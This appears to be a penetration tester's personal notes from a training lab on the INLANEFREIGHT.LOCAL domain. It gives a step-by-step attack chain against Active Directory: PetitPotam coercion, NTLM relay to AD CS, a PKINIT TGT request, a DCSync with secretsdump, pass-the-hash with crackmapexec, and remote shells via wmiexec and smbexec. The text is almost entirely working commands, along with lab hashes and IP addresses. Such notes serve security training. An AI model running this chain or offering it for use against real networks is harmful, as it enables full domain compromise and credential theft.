TGT request tool
https://github.com/dirkjanm/PKINITtools

Locate Certificate Authority Tool
https://github.com/zer1t0/certi

Linux petite potam
https://github.com/topotam/PetitPotam

Windows petite potam
https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1

Start ntlmrelay
```shell-session
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
```

Run petitepotam linux (attack to get certificate)
```shell-session
python3 PetitPotam.py 172.16.5.225 172.16.5.5 
```

Request tgt with pkinit (using certificate) saved into dc01.ccache
```shell-session
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache
```

Setting krb5ccname so attack host uses specified file for tgt
```shell-session
 export KRB5CCNAME=dc01.ccache
```

Use DC tgt acquired to dcsync
```shell-session
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

List credential cache on attack host
```
klist
```

Confirm admin access to DC with crackmapexec
```shell-session
crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf
```

Submit TGS request pkinittools suite (using key from pikinit above)
```shell-session
python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
```

Using NTLM Hash to DCSync (using hash from secretsdump first then hash from getnthash hash above)
```shell-session
secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
```


Gain shell with result from secretsdump.py
```
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf INLANEFREIGHT.LOCAL/administrator@172.16.5.5
```
or 
```
smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf INLANEFREIGHT.LOCAL/administrator@172.16.5.5
```
Request tgs and run petite potam via rubeus windows
[[Rubeus commands]]

DCSync with mimikatz
[[Mimikatz Command]]



